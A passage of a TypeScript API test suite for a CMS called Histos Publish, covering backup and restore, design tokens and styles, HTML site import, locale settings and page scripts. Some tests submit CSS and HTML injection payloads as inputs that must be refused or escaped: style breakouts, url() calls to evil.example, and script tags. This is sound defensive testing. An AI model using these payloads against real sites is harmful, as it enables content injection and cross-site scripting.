      const confirmed = await fetch(`${base}/api/cms/v1/connections/${connectionId}/operations/${randomUUID()}/rollback`, {
        method: "POST", headers, body: JSON.stringify({ confirmed: true }),
      });
      expect(confirmed.status).toBe(404);
      expect(await confirmed.json()).toMatchObject({ code: "cms-remote-operation-missing" });
    } finally {
      catalog.close();
    }
  });

  it("verifica una destinazione salvata senza dichiarare controllato l'accesso in scrittura", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Piano di pubblicazione" }) });
    expect(created.status).toBe(201);
    const { project } = await created.json() as { project: { id: string } };
    const destinationId = "9f8e6acc-f10c-4bfa-9bc0-a4f15b0e441a";
    const endpoint = `${base}/api/cms/v1/projects/${project.id}/destinations/inspect`;

    const anonymous = await fetch(endpoint, { method: "POST", headers: { "Content-Type": "application/json", Origin: base }, body: JSON.stringify({ destinationId }) });
    expect(anonymous.status).toBe(401);
    expect(destinationInspectionCalls).toEqual([]);

    const invalid = await fetch(endpoint, { method: "POST", headers, body: JSON.stringify({ destinationId: "non-valido" }) });
    expect(invalid.status).toBe(400);
    expect(await invalid.json()).toMatchObject({ code: "cms-destination-invalid" });
    expect(destinationInspectionCalls).toEqual([]);

    const inspected = await fetch(endpoint, { method: "POST", headers, body: JSON.stringify({ destinationId }) });
    expect(inspected.status, await inspected.clone().text()).toBe(200);
    expect(await inspected.json()).toMatchObject({
      schemaVersion: 1,
      destinationId,
      kind: "static-hosting",
      transport: "sftp",
      readVerified: true,
      writeVerified: false,
      detectedCapabilities: { atomicSwitch: false, rollback: false, deleteManaged: false, remoteVerify: true, runtimeProvision: false, databaseProbe: false },
    });
    expect(destinationInspectionCalls).toEqual([{ projectId: project.id, destinationId }]);
  });

  it("ripristina un backup completo in un catalogo CMS indipendente via API", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, {
      method: "POST",
      headers,
      body: JSON.stringify({ name: "Backup portabile" }),
    });
    expect(created.status).toBe(201);
    const source = await created.json() as { project: { id: string; name: string }; pages: unknown[] };

    const backup = await fetch(`${base}/api/cms/v1/projects/${source.project.id}/backup`, { method: "POST", headers });
    expect(backup.status).toBe(200);
    expect(backup.headers.get("content-disposition")).toContain(".histosproject");
    const archive = Buffer.from(await backup.arrayBuffer());

    const restoreDataDirectory = await mkdtemp(path.join(os.tmpdir(), "histos-cms-api-restore-data-"));
    const restoreUiDirectory = await mkdtemp(path.join(os.tmpdir(), "histos-cms-api-restore-ui-"));
    await writeFile(path.join(restoreUiDirectory, "index.html"), "<!doctype html><title>restore</title>");
    let restoreServer: LocalServerHandle | null = null;
    try {
      restoreServer = await startLocalServer({ dataDirectory: restoreDataDirectory, uiDirectory: restoreUiDirectory, openBrowser: false });
      const restoreBase = `http://127.0.0.1:${restoreServer.port}`;
      const restored = await fetch(`${restoreBase}/api/cms/v1/projects/restore`, {
        method: "POST",
        headers: { "X-Histos-Token": restoreServer.token, "Content-Type": "application/zip", Origin: restoreBase },
        body: archive,
      });
      expect(restored.status).toBe(201);
      const restoredProject = await restored.json() as { project: { id: string; name: string }; pages: unknown[]; assets: unknown[] };
      expect(restoredProject).toMatchObject({ project: source.project, pages: source.pages, assets: [] });

      const catalog = await fetch(`${restoreBase}/api/cms/v1/projects`, { headers: { "X-Histos-Token": restoreServer.token, Origin: restoreBase } });
      expect(catalog.status).toBe(200);
      expect(await catalog.json()).toMatchObject({ projects: [source.project] });
    } finally {
      if (restoreServer) await restoreServer.close();
      await Promise.all([rm(restoreDataDirectory, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }), rm(restoreUiDirectory, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 })]);
    }
  });

  it("rifiuta il ripristino di un backup con componenti in un ciclo dicendo di ripristinarne un altro, senza creare progetti", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    // A backup whose components call each other in a cycle, as an older version could save it: the app's own saves and
    // backups refuse the cycle, so its database is written directly.
    const sourceDirectory = await mkdtemp(path.join(os.tmpdir(), "histos-cms-api-cycle-"));
    try {
      const { project, store } = await new CmsProjectCatalog(sourceDirectory).createProject("Ciclo");
      let database: Buffer;
      try {
        const b = store.createComponent({ ref: "ui/b", title: "B" });
        store.createComponent({ ref: "ui/a", title: "A", content: '<!-- wp:xb/component {"uid":"aaaaaaaa01","ref":"ui/b"} /-->' });
        const sqlite = new DatabaseSync(path.join(project.directory, "content.sqlite"));
        sqlite.prepare("UPDATE cms_component_revisions SET content = ? WHERE id = ?").run('<!-- wp:xb/component {"uid":"bbbbbbbb01","ref":"ui/a"} /-->', b.headRevision);
        sqlite.close();
        database = await store.createDatabaseSnapshot();
      } finally { store.close(); }
      const body = {
        format: "histos-project",
        version: 1,
        generator: { name: "Histos Publish", version: "test" },
        project: { id: project.id, name: project.name, createdAt: project.createdAt, updatedAt: project.updatedAt, schemaVersion: 1 },
        files: [{ path: "content.sqlite", bytes: database.byteLength, sha256: createHash("sha256").update(database).digest("hex"), mediaType: "application/vnd.sqlite3" }],
      };
      const manifest = { ...body, manifestHash: createHash("sha256").update(canonicalizeJson(body as unknown as JsonValue)).digest("hex") };
      const zip = new yazl.ZipFile();
      zip.addBuffer(Buffer.from(canonicalizeJson(manifest as unknown as JsonValue)), "histos-project.json", { compress: false, mode: 0o100600, mtime: new Date(0) });
      zip.addBuffer(database, "content.sqlite", { compress: true, mode: 0o100600, mtime: new Date(0) });
      const chunks: Buffer[] = [];
      const archive = await new Promise<Buffer>((resolve, reject) => {
        zip.outputStream.on("data", (chunk: Buffer) => chunks.push(chunk));
        zip.outputStream.once("error", reject);
        zip.outputStream.once("end", () => resolve(Buffer.concat(chunks)));
        zip.end();
      });
      const headers = { "X-Histos-Token": server.token, Origin: base };
      const restored = await fetch(`${base}/api/cms/v1/projects/restore`, { method: "POST", headers: { ...headers, "Content-Type": "application/zip" }, body: archive });
      expect(restored.status).toBe(422);
      // Before: «… Togli uno di questi richiami nel builder.», with no project to open in the builder.
      expect(await restored.json()).toEqual({
        code: "cms-project-backup-invalid",
        error: "Il backup non si può ripristinare: il suo database contiene componenti che si richiamano in un ciclo (ui/b → ui/a → ui/b), e i componenti Histeon non possono richiamarsi in modo ricorsivo. Non è stato creato nessun progetto. Ripristina un altro backup di questo progetto, se ne hai uno (per esempio uno più vecchio).",
      });
      const projects = await fetch(`${base}/api/cms/v1/projects`, { headers });
      expect((await projects.json() as { projects: unknown[] }).projects).toEqual([]);
    } finally {
      await rm(sourceDirectory, { recursive: true, force: true });
    }
  });

  it("esegue anteprima, salvataggio e build del design system Histeon CSS", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Design Histeon CSS" }) });
    const { project } = await created.json() as { project: { id: string } };
    const prefix = `${base}/api/cms/v1/projects/${project.id}`;
    const framework = await fetch(`${prefix}/framework`, { headers });
    const frameworkBody = await framework.json() as { active: { id: string }; classes: Array<{ name: string }>; recipes: Record<string, string> };
    expect(framework.status).toBe(200);
    expect(frameworkBody.active.id).toBe("xb-tokens");
    expect(frameworkBody.classes.some((item) => item.name === "xb-container")).toBe(true);
    expect(frameworkBody.recipes.card).toContain("--xb-radius-l");

    const tokens = await fetch(`${prefix}/tokens`, { headers });
    const tokenState = await tokens.json() as { head: string; base: string; tokens: Record<string, string>; defaults: Record<string, string | number> };
    expect(tokens.status).toBe(200);
    expect(tokenState.defaults.radius).toBe(8);
    const preview = await fetch(`${prefix}/design/preview`, { method: "POST", headers, body: JSON.stringify({ design: { primary: "#e5533d", radius: 4 } }) });
    expect(preview.status).toBe(200);
    expect(await preview.json()).toMatchObject({ css: expect.stringContaining("--xb-primary:"), design: { radius: 4 } });
    // The tokens come only when asked: light always, dark only with the dark theme on.
    expect(await (await fetch(`${prefix}/design/preview`, { method: "POST", headers, body: JSON.stringify({ design: { primary: "#e5533d" } }) })).json()).not.toHaveProperty("tokens");
    const exported = await (await fetch(`${prefix}/design/preview`, { method: "POST", headers, body: JSON.stringify({ design: { primary: "#e5533d" }, tokens: true }) })).json() as { tokens: { light: Record<string, string>; dark: Record<string, string> | null } };
    expect(exported.tokens.dark).toBeNull();
    expect(exported.tokens.light["xb-primary"]).toMatch(/^oklch\(/u);
    expect(exported.tokens.light["xb-text-m"]).toContain("clamp(");
    const exportedDark = await (await fetch(`${prefix}/design/preview`, { method: "POST", headers, body: JSON.stringify({ design: { primary: "#e5533d", dark_on: 1 }, tokens: true }) })).json() as { tokens: { light: Record<string, string>; dark: Record<string, string> } };
    expect(Object.keys(exportedDark.tokens.dark).sort()).toEqual(Object.keys(exportedDark.tokens.light).sort());
    expect(exportedDark.tokens.dark["xb-bg"]).not.toBe(exportedDark.tokens.light["xb-bg"]);
    const badPreview = await fetch(`${prefix}/design/preview`, { method: "POST", headers, body: JSON.stringify({ design: { font_body: "url(https://evil.example)" } }) });
    expect(badPreview.status).toBe(400);

    const saved = await fetch(`${prefix}/tokens`, {
      method: "POST", headers,
      body: JSON.stringify({ head: tokenState.head, base: tokenState.base, tokens: { "xb-primary": "#123456" }, design: { primary: "#e5533d", radius: 4 } }),
    });
    expect(saved.status).toBe(200);
    expect(await saved.json()).toMatchObject({ base: tokenState.base });
    const styleState = await fetch(`${prefix}/styles`, { headers });
    const styles = await styleState.json() as { styles: unknown[]; globals: unknown[]; head: string; base: string; globalCss: string; compiledCss: string };
    expect(styles.globalCss).toContain("--xb-primary:#123456");
    expect(styles.globalCss).toContain("--xb-radius-m:0.25rem");
    expect(styles.compiledCss).toContain(".xb-container");

    const styleSave = await fetch(`${prefix}/styles`, {
      method: "POST", headers,
      body: JSON.stringify({ styles: styles.styles, globals: styles.globals, head: styles.head, base: styles.base }),
    });
    expect(styleSave.status).toBe(200);
    const savedStyles = await styleSave.json() as { head: string; base: string };

    const externalSource = { kind: "user-css", frameworkId: "core-framework", name: "Core Framework", version: "1.2", license: "MIT", rightsConfirmed: true } as const;
    const externalCss = { id: "framework-core-framework", css: ".u-stack { display: grid; } :root { --core-space-s: 1rem; }", source: externalSource };
    const externalStyleSave = await fetch(`${prefix}/styles`, {
      method: "POST", headers,
      body: JSON.stringify({ styles: styles.styles, globals: [externalCss], head: savedStyles.head, base: savedStyles.head }),
    });
    expect(externalStyleSave.status).toBe(200);
    const importedFramework = await fetch(`${prefix}/framework`, { headers });
    const importedFrameworkData = await importedFramework.json() as { variables: Array<{ name: string; group: string }>; classes: Array<{ name: string; group: string }> };
    expect(importedFrameworkData.variables).toContainEqual({ name: "core-space-s", group: "Core Framework" });
    expect(importedFrameworkData.classes).toContainEqual({ name: "u-stack", group: "Core Framework" });
    const importedExport = await fetch(`${prefix}/export`, { method: "POST", headers });
    expect(importedExport.status).toBe(200);
    const importedProfile = await decodeStaticPageArchive(Buffer.from(await importedExport.arrayBuffer()));
    const transferredStyles = importedProfile.profile.entities.find((entity) => entity.kind === "styles");
    expect(transferredStyles?.payload.globals).toMatchObject([{ source: externalSource }]);

    const fontBytes = Buffer.from([119, 79, 70, 50, 0, 0]);
    const fontUpload = await fetch(`${prefix}/media?filename=brand.woff2`, { method: "POST", headers: { ...headers, "Content-Type": "font/woff2" }, body: fontBytes });
    expect(fontUpload.status).toBe(201);
    const font = await fontUpload.json() as { asset_id: string; source_url: string };
    expect(font.asset_id).toMatch(/^[0-9a-f-]{36}$/u);
    const badFontUpload = await fetch(`${prefix}/media?filename=brand.woff2`, { method: "POST", headers: { ...headers, "Content-Type": "font/woff2" }, body: Buffer.from("not a font") });
    expect(badFontUpload.status).toBe(400);
    expect(await badFontUpload.json()).toMatchObject({ code: "cms-media-font-invalid" });
    const fontCss = { ...externalCss, css: "@font-face{font-family:Brand;src:url(../fonts/brand.woff2?v=1)}", assets: [{ reference: "../fonts/brand.woff2?v=1", assetId: font.asset_id }] };
    const fontStylesSave = await fetch(`${prefix}/styles`, {
      method: "POST", headers,
      body: JSON.stringify({ styles: styles.styles, globals: [fontCss], head: (await externalStyleSave.clone().json() as { head: string }).head, base: (await externalStyleSave.clone().json() as { head: string }).head }),
    });
    expect(fontStylesSave.status).toBe(200);
    const fontStylesResult = await fontStylesSave.json() as { head: string };
    const fontPreview = await fetch(`${prefix}/render`, { method: "POST", headers, body: JSON.stringify({ post_id: 1, content: "" }) });
    expect(fontPreview.status).toBe(200);
    expect(await fontPreview.json()).toMatchObject({ globalCss: expect.stringContaining(`/__cms-media/${project.id}/${font.asset_id}?v=1`) });

    const imageUpload = await fetch(`${prefix}/media?filename=hero.png`, { method: "POST", headers: { ...headers, "Content-Type": "image/png" }, body: Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]) });
    expect(imageUpload.status).toBe(201);
    const hero = await imageUpload.json() as { asset_id: string };
    const selectorCssSave = await fetch(`${prefix}/styles`, {
      method: "POST", headers,
      body: JSON.stringify({
        styles: [{ id: "hero", selector: ".hero", css: "background-image:url(../images/hero.png?v=4)", assets: [{ reference: "../images/hero.png?v=4", assetId: hero.asset_id }] }],
        globals: [fontCss], head: fontStylesResult.head, base: fontStylesResult.head,
      }),
    });
    expect(selectorCssSave.status).toBe(200);
    expect(await selectorCssSave.json()).toMatchObject({ styles: [{ selector: ".hero", assets: [{ assetId: hero.asset_id }] }] });
    const selectorPreview = await fetch(`${prefix}/render`, { method: "POST", headers, body: JSON.stringify({ post_id: 1, content: "" }) });
    expect(selectorPreview.status).toBe(200);
    expect(await selectorPreview.json()).toMatchObject({ css: expect.stringContaining(`/__cms-media/${project.id}/${hero.asset_id}?v=4`) });
    const cssTransfer = await fetch(`${prefix}/export`, { method: "POST", headers });
    expect(cssTransfer.status).toBe(200);
    const transferredCssProfile = await decodeStaticPageArchive(Buffer.from(await cssTransfer.arrayBuffer()));
    const transferredCssStyles = transferredCssProfile.profile.entities.find((entity) => entity.kind === "styles");
    expect(transferredCssStyles?.payload.styles).toMatchObject([{ selector: ".hero", assets: [{ reference: "../images/hero.png?v=4", assetId: hero.asset_id }] }]);
    expect(transferredCssStyles?.payload.globals).toMatchObject([{ css: expect.stringContaining("../fonts/brand.woff2?v=1"), assets: [{ reference: "../fonts/brand.woff2?v=1", assetId: font.asset_id }] }]);
    const transferredMedia = transferredCssProfile.profile.entities.filter((entity) => entity.kind === "asset");
    expect(transferredMedia.map((asset) => asset.id)).toEqual(expect.arrayContaining([hero.asset_id, font.asset_id]));

    const finalTokens = await fetch(`${prefix}/tokens`, { headers });
    expect(await finalTokens.json()).toMatchObject({
      head: expect.any(String),
      base: expect.any(String),
      tokens: { "xb-primary": "#123456" },
      design: { primary: "oklch(63.5% 0.185 31.2)", radius: 4 },
    });
    const invalidToken = await fetch(`${prefix}/tokens`, { method: "POST", headers, body: JSON.stringify({ head: styles.head, base: styles.base, tokens: { "xb-primary": "red;}body{display:none" } }) });
    expect(invalidToken.status).toBe(400);
  });

  it("salva variabili e ricette del sito: stampate nel CSS, offerte all'editor, portate a WordPress", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Variabili del sito" }) });
    const { project } = await created.json() as { project: { id: string } };
    const prefix = `${base}/api/cms/v1/projects/${project.id}`;
    const state = await (await fetch(`${prefix}/tokens`, { headers })).json() as { head: string; base: string; siteTokens: Record<string, string>; recipes: { site: Record<string, string>; histos: Record<string, string> } };
    expect(state.siteTokens).toEqual({});
    expect(state.recipes.histos.centra).toContain("place-items: center");

    for (const bad of [{ siteTokens: { Bagliore: "red" } }, { siteTokens: { bagliore: "red;}body{display:none" } }, { recipes: { mia: "background: url(https://evil.example/x.png);" } }, { recipes: { mia: "</style><script>" } }, { recipes: { mia: "a {" } }]) {
      const refused = await fetch(`${prefix}/tokens`, { method: "POST", headers, body: JSON.stringify({ head: state.head, base: state.base, tokens: {}, ...bad }) });
      expect(refused.status, JSON.stringify(bad)).toBe(400);
    }
    const saved = await fetch(`${prefix}/tokens`, {
      method: "POST", headers,
      body: JSON.stringify({ head: state.head, base: state.base, tokens: {}, siteTokens: { bagliore: "oklch(80% 0.1 30)" }, recipes: { centra: "display: grid;\nplace-items: start;", mia: "gap: var(--xb-site-bagliore);" } }),
    });
    expect(saved.status, await saved.clone().text()).toBe(200);
    const after = await (await fetch(`${prefix}/tokens`, { headers })).json() as { head: string; base: string; siteTokens: Record<string, string>; recipes: { site: Record<string, string> } };
    expect(after.siteTokens).toEqual({ bagliore: "oklch(80% 0.1 30)" });
    expect(after.recipes.site).toEqual({ centra: "display: grid;\nplace-items: start;", mia: "gap: var(--xb-site-bagliore);" });

    const styles = await (await fetch(`${prefix}/styles`, { headers })).json() as { globalCss: string };
    expect(styles.globalCss).toContain("--xb-site-bagliore:oklch(80% 0.1 30);");
    const framework = await (await fetch(`${prefix}/framework`, { headers })).json() as { recipes: Record<string, string>; variables: Array<{ name: string; group: string }> };
    expect(framework.recipes.centra, "the site recipe wins").toBe("display: grid;\nplace-items: start;");
    expect(framework.variables).toContainEqual(expect.objectContaining({ name: "xb-site-bagliore", group: "site" }));

    // Saving tokens alone keeps them.
    const kept = await fetch(`${prefix}/tokens`, { method: "POST", headers, body: JSON.stringify({ head: after.head, base: after.base, tokens: { "xb-primary": "#123456" } }) });
    expect(kept.status).toBe(200);
    expect(((await (await fetch(`${prefix}/tokens`, { headers })).json()) as { siteTokens: Record<string, string> }).siteTokens).toEqual({ bagliore: "oklch(80% 0.1 30)" });

    // To WordPress the variables travel as a global sheet; the recipes stay in the project.
    const transfer = await fetch(`${prefix}/export`, { method: "POST", headers });
    expect(transfer.status).toBe(200);
    const profile = await decodeStaticPageArchive(Buffer.from(await transfer.arrayBuffer()));
    const stylesEntity = profile.profile.entities.find((entity) => entity.kind === "styles");
    expect(stylesEntity?.payload.globals).toContainEqual({ id: "histos-site-tokens", css: ":root{--xb-site-bagliore:oklch(80% 0.1 30);}" });
    expect(Object.keys(stylesEntity?.payload ?? {})).not.toContain("siteRecipes");
  });

  it("converte una pagina HTML o lo ZIP di un sito caricati dal catalogo CMS, senza sito né build (doc 18 F1)", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const upload = async (kind: "html" | "zip", name: string, bytes: Buffer) => {
      const plan = await (await fetch(`${base}/api/imports`, { method: "POST", headers, body: JSON.stringify({ name: "Bottega", kind, files: [{ path: name, size: bytes.length }] }) })).json() as { id: string };
      const put = await fetch(`${base}/api/imports/${plan.id}/files/${encodeURIComponent(name)}`, { method: "PUT", headers: { "X-Histos-Token": server!.token, Origin: base, "Content-Type": "application/octet-stream" }, body: bytes });
      expect(put.status, await put.clone().text()).toBe(201);
      return plan.id;
    };
    const page = "<!doctype html><html lang=\"it\"><body><header><h1 class=\"titolo\">Bottega</h1></header><main><p>Pane {buono}</p><script>alert(1)</script></main></body></html>";
    const htmlId = await upload("html", "bottega.html", Buffer.from(page));
    const converted = await fetch(`${base}/api/imports/${htmlId}/cms-prototype`, { method: "POST", headers, body: "{}" });
    expect(converted.status, await converted.clone().text()).toBe(200);
    const body = await converted.json() as { prototype: string; fileName: string; report: { pages: number }; selectable: { original: number; selectable: number; share: number } };
    expect(body.prototype).toContain('data-histos-prototype="1"');
    // Doc 18 §9: the measure of the conversion comes with it (header, h1, main, p: all four stay elements).
    expect(body.selectable).toEqual({ original: 4, selectable: 4, share: 1 });
    expect(body.prototype).toContain("Bottega");
    // Doc 18 §6.6: the site's script is kept as text in the scripts part (JSON, never run), not in the markup.
    expect(body.prototype.replace(/<script data-histos="scripts" type="application\/json">[^<]*<\/script>/u, "")).not.toContain("alert(1)");
    expect(body.prototype).toMatch(/<script data-histos="scripts" type="application\/json">\{"pages":\{"home":"[^"]*alert\(1\)/u);
    expect(body.report.pages).toBe(1);
    // The same upload converts again with other choices, until it is deleted.
    expect((await fetch(`${base}/api/imports/${htmlId}/cms-prototype`, { method: "POST", headers, body: JSON.stringify({ structure: { parts: true } }) })).status).toBe(200);
    expect((await fetch(`${base}/api/imports/${htmlId}`, { method: "DELETE", headers })).status).toBeLessThan(300);
    expect((await fetch(`${base}/api/imports/${htmlId}/cms-prototype`, { method: "POST", headers, body: "{}" })).status).toBe(404);

    // A ZIP: its pages, with the paths checked as for a site.
    const archive = new yazl.ZipFile();
    const chunks: Buffer[] = [];
    archive.outputStream.on("data", (chunk: Buffer) => chunks.push(chunk));
    const done = new Promise<void>((resolve) => archive.outputStream.once("end", () => resolve()));
    archive.addBuffer(Buffer.from(page), "sito/index.html");
    archive.addBuffer(Buffer.from("<!doctype html><html><body><h1>Chi siamo</h1></body></html>"), "sito/chi-siamo.html");
    archive.end();
    await done;
    const zipId = await upload("zip", "sito.zip", Buffer.concat(chunks));
    // A site's folder: its files, with their paths.
    const plan = await (await fetch(`${base}/api/imports`, { method: "POST", headers, body: JSON.stringify({ name: "Cartella", kind: "directory", files: [{ path: "index.html", size: Buffer.byteLength(page) }, { path: "css/sito.css", size: Buffer.byteLength(".titolo{color:#123;}") }] }) })).json() as { id: string };
    for (const [file, bytes] of [["index.html", Buffer.from(page)], ["css/sito.css", Buffer.from(".titolo{color:#123;}")]] as const) {
      expect((await fetch(`${base}/api/imports/${plan.id}/files/${file}`, { method: "PUT", headers: { "X-Histos-Token": server.token, Origin: base, "Content-Type": "application/octet-stream" }, body: bytes })).status).toBe(201);
    }
    const folder = await fetch(`${base}/api/imports/${plan.id}/cms-prototype`, { method: "POST", headers, body: "{}" });
    expect(folder.status, await folder.clone().text()).toBe(200);
    await fetch(`${base}/api/imports/${plan.id}`, { method: "DELETE", headers });

    // Images of other sites are downloaded (doc 18 §6.2); one that fails stays out with a note.
    const png = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==", "base64");
    const asked: string[] = [];
    fakeAssetFetcher = async (url) => {
      asked.push(url);
      if (url.includes("rotta")) throw new Error("404");
      return new Uint8Array(png);
    };
    try {
      const remoteId = await upload("html", "remoto.html", Buffer.from('<!doctype html><html><body><img src="https://cdn.example.org/foto.png" alt="Foto" width="1" height="1"><img src="https://cdn.example.org/rotta.png" alt=""></body></html>'));
      const remote = await fetch(`${base}/api/imports/${remoteId}/cms-prototype`, { method: "POST", headers, body: "{}" });
      expect(remote.status, await remote.clone().text()).toBe(200);
      const remoteBody = await remote.json() as { prototype: string; report: { notes: string[] } };
      expect(asked.sort()).toEqual(["https://cdn.example.org/foto.png", "https://cdn.example.org/rotta.png"]);
      expect(remoteBody.prototype).toMatch(/<img src="asset:foto" alt="Foto"/u);
      expect(remoteBody.prototype).not.toContain("rotta");
      expect(remoteBody.report.notes.join("\n")).toContain("media scaricati da cdn.example.org");
      expect(remoteBody.report.notes.join("\n")).toContain("media non scaricati da cdn.example.org");
      await fetch(`${base}/api/imports/${remoteId}`, { method: "DELETE", headers });
    } finally {
      fakeAssetFetcher = undefined;
    }
    const zipped = await fetch(`${base}/api/imports/${zipId}/cms-prototype`, { method: "POST", headers, body: "{}" });
    expect(zipped.status, await zipped.clone().text()).toBe(200);
    expect(((await zipped.json()) as { report: { pages: number } }).report.pages).toBe(2);
    await fetch(`${base}/api/imports/${zipId}`, { method: "DELETE", headers });
  });

  it("espone e salva lingua e fuso orario per anteprima e build del progetto", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Locale progetto" }) });
    const { project } = await created.json() as { project: { id: string } };
    const initial = await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers });
    const initialBody = await initial.json() as { renderSettings?: { locale: string; timeZone: string } };
    expect(initialBody.renderSettings?.locale).toBeTruthy();
    expect(initialBody.renderSettings?.timeZone).toBeTruthy();

    const saved = await fetch(`${base}/api/cms/v1/projects/${project.id}/settings`, { method: "PATCH", headers, body: JSON.stringify({ locale: "it-it", timeZone: "Europe/Rome" }) });
    expect(saved.status).toBe(200);
    expect(await saved.json()).toEqual({ renderSettings: { locale: "it-IT", timeZone: "Europe/Rome" }, imageSettings: { variants: true, widths: [480, 960, 1600], quality: { avif: 60, jxl: 75, webp: 75 } }, siteUrl: null });
    // B6: `images` changes only what it names; an invalid value changes nothing, the language included.
    const images = await fetch(`${base}/api/cms/v1/projects/${project.id}/settings`, { method: "PATCH", headers, body: JSON.stringify({ locale: "it-IT", timeZone: "Europe/Rome", images: { variants: false } }) });
    expect((await images.json() as { imageSettings: unknown }).imageSettings).toEqual({ variants: false, widths: [480, 960, 1600], quality: { avif: 60, jxl: 75, webp: 75 } });
    const refused = await fetch(`${base}/api/cms/v1/projects/${project.id}/settings`, { method: "PATCH", headers, body: JSON.stringify({ locale: "en-US", timeZone: "Europe/Rome", images: { quality: { avif: 0 } } }) });
    expect(refused.status).toBe(400);
    expect(await refused.json()).toMatchObject({ code: "cms-image-settings-invalid" });
    const after = await (await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers })).json() as { renderSettings: { locale: string }; imageSettings: { variants: boolean } };
    expect([after.renderSettings.locale, after.imageSettings.variants]).toEqual(["it-IT", false]);

    const componentContent = '<!-- wp:xb/element {"uid":"regional001","tag":"section"} --><!-- wp:xb/element {"uid":"regional002","tag":"p"} --><!-- wp:xb/text {"uid":"regional003","content":"{props.amount.number(2)}"} /--><!-- /wp:xb/element --><!-- wp:xb/element {"uid":"regional004","tag":"time"} --><!-- wp:xb/text {"uid":"regional005","content":"{props.when.date(\'d/m/Y\')}"} /--><!-- /wp:xb/element --><!-- /wp:xb/element -->';
    const componentResponse = await fetch(`${base}/api/cms/v1/projects/${project.id}/components`, {
      method: "POST", headers,
      body: JSON.stringify({ ref: "ui/regional", title: "Regional", schema: { props: { amount: { type: "number", default: 1234.5 }, when: { type: "string", default: "2026-10-23" } } }, content: componentContent }),
    });
    expect(componentResponse.status).toBe(201);
    const component = await componentResponse.json() as { id: number };
    const rendered = await fetch(`${base}/api/cms/v1/projects/${project.id}/render`, {
      method: "POST", headers,
      body: JSON.stringify({ post_id: component.id, content: componentContent }),
    });
    const renderedBody = await rendered.json() as { html?: string; error?: string };
    expect(rendered.status, JSON.stringify(renderedBody)).toBe(200);
    expect(renderedBody).toMatchObject({ html: expect.stringContaining("1.234,50") });
    expect(await (await fetch(`${base}/api/cms/v1/projects/${project.id}/render`, {
      method: "POST", headers,
      body: JSON.stringify({ post_id: component.id, content: componentContent }),
    })).text()).toContain("23/10/2026");

    const invalid = await fetch(`${base}/api/cms/v1/projects/${project.id}/settings`, { method: "PATCH", headers, body: JSON.stringify({ locale: "non una lingua", timeZone: "Europe/Rome" }) });
    expect(invalid.status).toBe(400);
    expect(await invalid.json()).toMatchObject({ code: "cms-render-settings-invalid" });
    const reopened = await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers });
    expect(await reopened.json()).toMatchObject({ renderSettings: { locale: "it-IT", timeZone: "Europe/Rome" } });
  });

  it("tiene il JavaScript di pagine e componenti: nella build come modulo, mai nel canvas, nel profilo con la sua capacità (doc 18 §6.6)", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Script locale" }) });
    const { project } = await created.json() as { project: { id: string } };
    const details = await (await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers })).json() as { pages: Array<{ alias: number; slug: string; headRevision: string }> };
    const page = details.pages.find(({ slug }) => slug === "home")!;
    const document = await (await fetch(`${base}/api/cms/v1/projects/${project.id}/documents/${page.alias}`, { headers })).json() as { content: string; head: string; script: string; scriptEditable: boolean };
    expect(document).toMatchObject({ script: "", scriptEditable: true });
    const script = "window.pronto = '</script><!--';";
    const tooBig = await fetch(`${base}/api/cms/v1/projects/${project.id}/documents/${page.alias}`, { method: "POST", headers, body: JSON.stringify({ head: document.head, content: document.content, script: "x".repeat(100_001) }) });
    expect(tooBig.status).toBe(422);
    const saved = await fetch(`${base}/api/cms/v1/projects/${project.id}/documents/${page.alias}`, { method: "POST", headers, body: JSON.stringify({ head: document.head, content: document.content, script }) });
    expect(saved.status).toBe(200);
    expect(await saved.json()).toMatchObject({ script });

    const rendered = await (await fetch(`${base}/api/cms/v1/projects/${project.id}/render`, { method: "POST", headers, body: JSON.stringify({ post_id: page.alias, content: document.content }) })).json() as { html?: string };
    expect(rendered.html).not.toContain("window.pronto");

    const published = await fetch(`${base}/api/cms/v1/projects/${project.id}/pages/${page.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: (await (await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers })).json() as { pages: Array<{ slug: string; headRevision: string }> }).pages.find(({ slug }) => slug === "home")!.headRevision }) });
    expect(published.status).toBe(200);
    const built = await fetch(`${base}/api/cms/v1/projects/${project.id}/build`, { method: "POST", headers, body: "{}" });
    const result = await built.json() as { status: string; previewUrl: string | null };
    expect(result.status).toBe("ready");
    const builtHtml = await (await fetch(result.previewUrl!)).text();
    expect(builtHtml).toContain("<script type=\"module\">window.pronto = '<\\/script><\\u0021--';</script></body>");

